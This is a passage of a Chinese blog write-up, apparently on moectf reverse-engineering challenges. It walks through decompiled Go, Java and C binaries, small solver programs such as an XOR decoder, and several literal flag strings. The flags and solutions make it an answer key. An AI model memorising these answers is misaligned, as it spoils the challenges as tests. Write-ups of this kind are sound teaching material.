</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_4B0720</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">fmt_Fprintln</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">      <span class="n">a1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Writer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Writer</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="n">os_Stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 后面一个else一个return,都不是重点 */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>一不小心看到了代码里有一个<code>Fscanln</code>, 想着这肯定是读取输入, 得了, 分析一下, 不用再找<code>flag</code>了, 然后发现<code>if</code>语句里比较了<code>v19</code>和<code>1107LL</code>, 果断打开题目给的<code>exe</code>, 然后输入<code>1107</code>, 成功拿到<code>flag</code>! <code>flag: moectf{G0_1Anguage_1s_1nT3r3st1ng}</code></p>
<h3 id="java-re">Java RE</h3>
<p>给大佬递咖啡~ 诶,劳资咖啡咧, 好像丢了…</p>
<p>这道题, 用JD-GUI反编译了一下, 得到了一份狠长的代码:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">qqq</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.GridLayout</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.event.ActionEvent</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.awt.event.ActionListener</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JButton</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JFrame</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JLabel</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JPanel</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.swing.JTextField</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Box</span> <span class="kd">implements</span> <span class="n">ActionListener</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* 一堆变量声明 */</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">CHECK</span><span class="o">(</span><span class="kt">int</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">&gt;</span> <span class="n">10000000</span> <span class="o">&amp;&amp;</span> <span class="n">input</span> <span class="o">&lt;</span> <span class="n">99999999</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v7</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v8</span> <span class="o">=</span> <span class="n">10000000</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">v3</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">Math</span><span class="o">.</span><span class="na">abs</span><span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">1000</span> <span class="o">%</span> <span class="n">100</span> <span class="o">-</span> <span class="n">80</span><span class="o">)</span> <span class="o">==</span> <span class="n">3</span> <span class="o">&amp;&amp;</span>
</span></span><span class="line"><span class="cl">                <span class="n">input</span> <span class="o">%</span> <span class="n">1000</span> <span class="o">%</span> <span class="n">927</span> <span class="o">==</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">v5</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">while</span> <span class="o">(</span><span class="n">v5</span> <span class="o">&lt;</span> <span class="n">4</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">v7</span> <span class="o">%</span> <span class="n">10</span> <span class="o">!=</span> <span class="n">input</span> <span class="o">/</span> <span class="n">v8</span> <span class="o">%</span> <span class="n">10</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">v3</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v7</span> <span class="o">*=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v8</span> <span class="o">/=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="n">v5</span><span class="o">++;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">v3</span> <span class="o">!=</span> <span class="n">1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">v3</span> <span class="o">==</span> <span class="n">1</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">Box</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* UI设置, 对题目没什么用, 为省篇幅不列出了 */</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">actionPerformed</span><span class="o">(</span><span class="n">ActionEvent</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* 一些废话, 一堆if, 省篇幅就不粘贴进来了 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">getSource</span><span class="o">()</span> <span class="o">==</span> <span class="k">this</span><span class="o">.</span><span class="na">bt</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">CHECK</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;moectf{&#34;</span> <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span>
</span></span><span class="line"><span class="cl">                                                    <span class="n">1000000</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">10000</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">                        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">100</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">                                <span class="s">&#34;_he}&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;clear and try again!&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* 和解题无关的处理 */</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>我把源代码精简了一下, 以便看得更清楚点.</p>
<p>既然是一个GUI程序, 开始运行当然不能找<code>main</code>了.. 注意到题里有个<code>actionPerformed</code>, 好, 就从这个函数开始吧.. 然后在最后面看见了CHECK, 再调转头去看CHECK, 发现是一个检测输入的函数.</p>
<p>根据<code>if (input &gt; 10000000 &amp;&amp; input &lt; 99999999)</code>知道输入是一个八位数, 接着看<code>if (Math.abs(input / 1000 % 100 - 80) == 3 &amp;&amp; input % 1000 % 927 == 0)</code>知道了中间两位是83或者77 ( 第一次做的时候没看见abs函数,浪费了n久最后发现差点气得摔键盘 ) 最后3位是927.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">while</span> <span class="o">(</span><span class="n">v5</span> <span class="o">&lt;</span> <span class="n">4</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">input</span> <span class="o">/</span> <span class="n">v7</span> <span class="o">%</span> <span class="n">10</span> <span class="o">!=</span> <span class="n">input</span> <span class="o">/</span> <span class="n">v8</span> <span class="o">%</span> <span class="n">10</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">v3</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">*=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v8</span> <span class="o">/=</span> <span class="n">10</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v5</span><span class="o">++;</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>这个循环是用来判断回文数字的, 我们已经知道了八位数的后五位是77927, 对称过去就是72977927.</p>
<p>然后回到<code>actionPerformed</code>函数, 发现这么几句:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span><span class="n">CHECK</span><span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">this</span><span class="o">.</span><span class="na">tx</span><span class="o">.</span><span class="na">setText</span><span class="o">(</span><span class="s">&#34;moectf{&#34;</span> <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">1000000</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">10000</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">        <span class="o">+</span> <span class="o">(</span><span class="kt">char</span><span class="o">)</span> <span class="o">(</span><span class="n">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">a</span><span class="o">)</span> <span class="o">/</span> <span class="n">100</span> <span class="o">%</span> <span class="n">100</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;_he}&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></div><p>这个提取出来了72977927的前六位72, 97, 79并用ASCII解码, 然后把字符串拼起来..</p>
<p>出于懒, 写一小程序, 解之:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">72</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">97</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">79</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;moectf{&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">a</span> <span class="o">&lt;&lt;</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="n">c</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;_he}&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>咖啡真好喝~</p>
<h3 id="mine-sweep">Mine Sweep</h3>
<p>这道题没什么好说的&hellip;我扫雷通关了&hellip;真逆向的话, 我还没有试过. ( 逃…</p>
<h3 id="easy-re">Easy RE</h3>
<p>有了对上面的Easy的体验我丝毫不敢觉得这题狠easy&hellip;果不其然, 扔进<code>IDA</code>之后我一脸蒙圈, 这是个什么玩意儿啊&hellip;</p>
<p>不管了, 找到了<code>main</code>, 然后F5, 得到以下东东:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 变量声明 */</span>
</span></span><span class="line"><span class="cl">  <span class="n">v11</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4011E0</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v10</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="mi">4194587627529708148LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v5</span> <span class="o">=</span> <span class="mi">653654411009211005LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="mi">4502494060534902393LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="mi">1048127506</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="mi">12340</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="mi">77</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_4040B0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_401270</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_4012A0</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>啊嘞? 这画风怎么这么奇怪? 我看了眼题目描述, 得, <code>AntiAntiDebug</code>我一准儿是不会了, 那就解码吧&hellip;</p>
<p>顺着函数找了好久</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">signed</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_401270</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">a1</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">sub_401240</span><span class="p">(</span><span class="n">byte_404080</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">5LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sub_4012A0</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">byte_40409F</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这是<code>main</code>里面提到的两个函数, 分别看了下, 一个指向<code>byte_404080</code>, 一个指向<code>byte_40409F</code></p>
<p>本以为是那些常用的编码的decode, 结果发现根本没有这些字串&hellip;于是, 我想到了<code>Moe RE</code>&hellip;</p>
<p>先找到了<code>byte_404080</code>, 在长下面这样:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.data:404080 byte_404080     db 74h, 22h, 28h, 2Eh, 39h, 2Bh, 36h, 3Ah, 7Dh, 3Ah, 12h
.data:404080                                         ; DATA XREF: sub_401270+8↑o
.data:404080                                         ; sub_401360+96↑r ...
.data:404080                 db 3Eh, 39h, 3Fh, 12h, 9, 79h, 2Eh, 7Dh, 29h, 7Eh, 12h
.data:404080                 db 7Ch, 3Eh, 12h, 28h, 79h, 3Eh, 34h, 30h, 4Dh
</code></pre><p>按照<code>MoeRE</code>的思想, 我想着找个数来挨个异或一下试试..然后写了个小程序:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">v404080</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x2B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x3F</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x4D</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">77</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">do</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%x&#34;</span><span class="p">,</span> <span class="n">v404080</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>第一次试的时候, <code>key</code>用的是 <code>a1</code> 的 <code>109</code> , 然后发现不对&hellip;? 后来看了一眼<code>main</code>里面的<code>v4~v9</code>, 感觉太大的数怎么也不可能当<code>key</code>, 就拿<code>77</code>试了试&hellip; 然后运行了下<code>flag</code>就出来了&hellip;?</p>
<h3 id="algorithm-task">Algorithm Task</h3>
<p>这道题一看文件名叫hard就知道肯定不简单&hellip;</p>
<p>扔进<code>IDA</code>, 然后看到了一副宏伟壮观的程序跳转画面……</p>
<p>果断找到<code>main</code>函数按F5, 然后看见了<code>Decompiling</code>窗口卡了半天, 最后出来了下面的代码:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 200多个变量声明 */</span>
</span></span><span class="line"><span class="cl">  <span class="n">v186</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v184</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v187</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v175</span> <span class="o">=</span> <span class="mi">1093207085</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 5个嵌套的 while(1) */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">             <span class="cm">/* 一大堆不知所以的计算过程 */</span>
</span></span><span class="line"><span class="cl">             <span class="cm">/* 还有仨Wrong Flag的判定 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="o">-</span><span class="mi">866985480</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="s">&#34;dcba3261b6ef0d77&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v107</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="s">&#34;dcba3261b6ef0d77&#34;</span><span class="p">,</span> <span class="mh">0x10uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v108</span> <span class="o">=</span> <span class="mi">1750495256</span><span class="p">;</span> <span class="c1">// 找到第一个字符串, 盲猜是MD5加密
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span> <span class="n">v107</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">v108</span> <span class="o">=</span> <span class="mi">402522278</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v175</span> <span class="o">=</span> <span class="n">v108</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 一大堆else if,并不是很能看懂在干什么
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">v175</span> <span class="o">==</span> <span class="mi">184885918</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Please input the flag:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span> <span class="c1">// 然后看见了输入
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">a2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">s2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%42s&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s2</span><span class="p">);</span>
